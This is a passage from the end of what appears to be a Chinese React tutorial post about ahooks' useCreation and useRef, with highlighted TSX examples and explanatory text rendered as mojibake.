    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>ç‚¹å‡»æŒ‰é’®ï¼Œç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œä¸ä¼šæ‰§è¡Œ new Subject() çš„å®ä¾‹åŒ–è¿‡ç¨‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e1181a6b21c418cb0e485c27047d9ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=vUNJsNePjjK5sczsj2qyIuoJIxY%3D" alt="image.png" loading="lazy"/></p>
<p>é‚£å¦‚æœä¾èµ–å‘ç”Ÿæ”¹å˜ï¼Œæ¯æ¬¡ä¹Ÿåªä¼šé‡æ–°è®¡ç®—ä¸€æ¬¡</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useCreation } <span class="hljs-keyword">from</span> <span class="hljs-string">"ahooks"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constrcutor====="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">const</span> foo = <span class="hljs-title function_">useCreation</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>(), [flag]);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{foo.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>å¦‚å›¾ï¼Œæˆ‘ç‚¹å‡»äº†å…«æ¬¡æŒ‰é’®ï¼Œä¾èµ–æ”¹å˜äº†å…«æ¬¡</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62722c74b4224a328181f072ead8eda8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=ghAu0BYpwmF%2BLI0SbFCNLeT800A%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰€ä»¥ï¼ŒuseRefå¹¶ä¸æ˜¯åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè€Œæ˜¯æ¯æ¬¡ç»„ä»¶æ¸²æŸ“éƒ½æ‰§è¡Œï¼Œåªä¸è¿‡å¦‚æœä¹‹å‰æœ‰ç»“æœå°±è¿”å›ä¹‹å‰çš„ç»“æœè€Œå·²ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>